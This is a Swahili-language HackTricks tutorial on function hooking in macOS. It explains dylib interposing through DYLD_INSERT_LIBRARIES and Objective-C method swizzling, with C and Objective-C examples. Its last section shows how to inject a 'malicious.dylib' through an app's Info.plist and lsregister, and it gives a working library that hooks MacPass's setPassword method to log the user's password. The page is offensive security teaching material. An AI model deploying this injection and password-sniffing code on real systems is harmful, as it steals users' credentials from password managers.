# Kufunga Kazi ya macOS

{% hint style="success" %}
Jifunze na zoezi la AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze na zoezi la GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Aunga mkono HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Kuingilia Kazi

Tengeneza **dylib** na sehemu ya **`__interpose` (`__DATA___interpose`)** (au sehemu iliyofungwa na **`S_INTERPOSING`**) inayojumuisha jozi za **pointa za kazi** zinazorejelea **kazi za awali** na **kazi mbadala**.

Kisha, **ingiza** dylib na **`DYLD_INSERT_LIBRARIES`** (kuingilia kazi kunahitaji kutokea kabla ya programu kuu kuanza). Kwa dhahiri [**vizuizi** vilivyowekwa kwa matumizi ya **`DYLD_INSERT_LIBRARIES`** vinatumika hapa pia](macos-library-injection/#check-restrictions).

### Kuingilia printf

{% tabs %}
{% tab title="interpose.c" %}
{% code title="interpose.c" overflow="wrap" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{% endcode %}
{% endtab %}

{% tab title="hello.c" %}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{% endtab %}

{% tab title="interpose2.c" %}
{% code overflow="wrap" %}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{% endcode %}
{% endtab %}
{% endtabs %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
{% hint style="warning" %}
Chaguo la mazingira la **`DYLD_PRINT_INTERPOSTING`** linaweza kutumika kwa kusudi la kudekta interposing na litachapisha mchakato wa interpose.
{% endhint %}

Pia elewa kwamba **interposing hutokea kati ya mchakato na maktaba zilizopakiwa**, haitafanyi kazi na hifadhi ya maktaba iliyoshirikiwa.

### Interposing ya Kisasa

Sasa pia ni iwezekanavyo kuingiza kazi kwa njia ya kisasa kwa kutumia kazi ya **`dyld_dynamic_interpose`**. Hii inaruhusu kuingiza kazi kwa njia ya programu wakati wa muda wa uendeshaji badala ya kufanya hivyo tu kutoka mwanzoni.

Inahitajika tu kuonyesha **tuples** ya **kazi ya kuchukua nafasi na kazi mbadala**.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
## Kufunga Njia

Katika ObjectiveC hivi ndivyo njia inavyoitwa: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Inahitajika **kitu**, **njia** na **vipimo**. Na wakati njia inaitwa **msg inatumwa** kutumia kazi **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Kitu ni **`someObject`**, njia ni **`@selector(method1p1:p2:)`** na hoja ni **value1**, **value2**.

Kufuatia miundo ya vitu, ni rahisi kufikia **orodha ya njia** ambapo **majina** na **pointi** kwa msimbo wa njia zinapatikana.

{% hint style="danger" %}
Tafadhali kumbuka kwamba kwa sababu njia na madarasa vinapata kulingana na majina yao, habari hii imehifadhiwa kwenye binary, hivyo ni rahisi kuipata kwa kutumia `otool -ov </path/bin>` au [`class-dump </path/bin>`](https://github.com/nygard/class-dump)
{% endhint %}

### Kufikia njia za asili

Inawezekana kupata habari za njia kama jina, idadi ya vipimo au anwani kama ilivyo katika mfano ufuatao:

{% code overflow="wrap" %}
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Kuchanganya Njia na method\_exchangeImplementations

Kazi ya **`method_exchangeImplementations`** inaruhusu **kubadilisha** **anwani** ya **utekelezaji** wa **kazi moja kwa nyingine**.

{% hint style="danger" %}
Hivyo wakati kazi inaitwa ni **kazi nyingine inayotekelezwa**.
{% endhint %}

{% code overflow="wrap" %}
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
{% endcode %}

{% hint style="warning" %}
Katika kesi hii ikiwa **mimiliki wa utekelezaji wa njia halali** inathibitisha **jina la njia** inaweza **kugundua** uingizaji huu na kuzuia usifanye kazi.

Mbinu ifuatayo haina kizuizi hiki.
{% endhint %}

### Kuchanganya Njia na method\_setImplementation

Muundo uliopita ni wa ajabu kwa sababu unabadilisha utekelezaji wa njia 2 moja kutoka kwa nyingine. Kwa kutumia kazi **`method_setImplementation`** unaweza **kubadilisha** utekelezaji wa **njia moja kwa nyingine**.

Kumbuka **kuhifadhi anwani ya utekelezaji wa ile ya awali** ikiwa utaita kutoka kwa utekelezaji mpya kabla ya kuibadilisha kwa sababu baadaye itakuwa ngumu sana kutambua anwani hiyo. 

{% code overflow="wrap" %}
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
{% endcode %}

## Methodolojia ya Mashambulizi ya Hooking

Katika ukurasa huu njia tofauti za kufunga kazi zilijadiliwa. Hata hivyo, zilihusisha **kuendesha nambari ndani ya mchakato ili kushambulia**.

Ili kufanya hivyo, njia rahisi zaidi ya kutumia ni kuingiza [Dyld kupitia mazingira ya mazingira au utekaji nyara](macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md). Hata hivyo, nadhani hii inaweza pia kufanywa kupitia [Uingizaji wa mchakato wa Dylib](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).

Hata hivyo, chaguo zote mbili zinakabiliwa na **vitu vya kikomo** kwa **binari/mchakato usiolindwa**. Angalia kila mbinu kujifunza zaidi kuhusu vikwazo.

Hata hivyo, shambulizi la kufunga kazi ni maalum sana, muhusika atafanya hivi ili **kuiba habari nyeti kutoka ndani ya mchakato** (ikiwa sivyo ungefanya shambulizi la kuingiza mchakato). Na habari nyeti hii inaweza kuwa katika Programu zilizopakuliwa na mtumiaji kama vile MacPass.

Kwa hivyo, mwelekeo wa muhusika ungekuwa au kupata mwanya au kuondoa saini ya programu, kuingiza **`DYLD_INSERT_LIBRARIES`** kwa njia ya mazingira kupitia Info.plist ya programu kwa kuongeza kitu kama:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
na kisha **sajili tena** programu:

{% code overflow="wrap" %}
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
{% endcode %}

Ongeza katika maktaba hiyo nambari ya kufunga ili kuchukua habari: Nywila, ujumbe...

{% hint style="danger" %}
Tafadhali elewa kwamba katika toleo jipya la macOS ikiwa utaondoa **sahihi** ya faili ya maombi na ilikuwa imeendeshwa hapo awali, macOS **haitaendesha tena maombi**.
{% endhint %}

#### Mfano wa Maktaba
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
{% endcode %}

## Marejeo

* [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

{% hint style="success" %}
Jifunze na zoezi la Udukuzi wa AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze na zoezi la Udukuzi wa GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
